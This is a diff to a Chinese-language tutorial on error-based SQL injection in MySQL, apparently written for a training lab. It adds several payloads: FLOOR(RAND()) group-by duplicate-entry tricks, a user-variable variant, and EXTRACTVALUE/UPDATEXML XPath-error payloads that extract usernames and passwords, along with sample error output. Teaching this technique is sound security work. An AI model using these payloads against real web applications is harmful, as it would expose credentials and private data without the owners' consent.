@@ -127,4 +127,16 @@ else {
 ```
 本代码的特点是不会在网页上输出任何字段值。
 ###2.注入思路
-由于程序代码并不在网页上显示任何字段，因此我们如果想要得到数据库的一些信息得另外想办法。有一个方法是利用程序执行SQL时产生的错误会显示到网页上这一点，将要显示的信息嵌入错误信息里。对于MySQL利用的模板代码为```select count(*), CONCAT(CURRENT_USER(), FLOOR(RAND(0)*2)) x from information_schema.tables group by x;```会得到类似```ERROR 1062 (23000): Duplicate entry 'root@localhost1' for key 'group_key'```的错误提示。
+由于程序代码并不在网页上显示任何字段，因此我们如果想要得到数据库的一些信息得另外想办法。有一个方法是利用程序执行SQL时产生的错误会显示到网页上这一点，将要显示的信息嵌入错误信息里。对于MySQL利用的模板代码为```SELECT COUNT(*), CONCAT(CURRENT_USER(), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x;```会得到类似```ERROR 1062 (23000): Duplicate entry 'sqli@localhost1' for key 'group_key'```的错误提示。经典的MySQL报错代码还有
+
+* ```SELECT 1,2 UNION SELECT COUNT(*), CONCAT(CURRENT_USER(), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x;```
+* ```SELECT COUNT(*) FROM (SELECT 1 UNION SELECT NULL UNION SELECT !1) GROUP BY CONCAT(CURRENT_USER(), FLOOR(RAND(0)*2))```
+* 如果RAND被禁,可以使用用户变量来报错 ```SELECT MIN(@a:=1) FROM information_schema.tables GROUP BY CONCAT(password, @a:=(@a+1)%2)```
+
+在mysql 5.1版本中加入了两个XML函数，也可以用来报错
+
+* ```mysql> SELECT * FROM users WHERE id=1 AND EXTRACTVALUE(1, CONCAT(0x5C, (SELECT username FROM users LIMIT 1)));
+ERROR 1105 (HY000): XPATH syntax error: '\Dumb'```
+* ```mysql> SELECT * FROM users WHERE id=1 AND 1=(UPDATEXML(1, CONCAT(0x5E24, (SELECT password FROM users LIMIT 1), 0x5E24), 1));
+ERROR 1105 (HY000): XPATH syntax error: '^$Dumb^$'```
+
